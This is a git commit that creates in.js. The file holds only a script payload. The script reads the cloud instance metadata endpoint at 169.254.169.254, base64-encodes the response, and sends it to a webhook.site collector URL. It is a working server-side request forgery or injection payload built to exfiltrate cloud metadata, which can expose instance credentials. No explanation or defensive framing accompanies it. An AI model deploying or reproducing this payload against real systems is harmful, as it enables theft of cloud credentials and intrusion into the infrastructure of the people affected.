092c8a9ae35f21cfdaca5aee5e23794e946f8f55
alexey-kirillov <46591626+alexey-kirillov@users.noreply.github.com>
2023-11-17 16:19:42 +0300

    Create in.js

---
+++ in.js
@@ -0,0 +1,13 @@
+<script>
+const request = new XMLHttpRequest();
+request.open("GET", "http://169.254.169.254/latest/meta-data", false);
+request.send(null);
+
+//if (request.status === 200) {
+
+   const request2 = new XMLHttpRequest();
+   request2.open("GET", "https://webhook.site/61d14abf-1552-4231-ac33-481aca823fff?r="+btoa(request.responseText), false);
+   request2.send(null);
+//}
+
+</script>
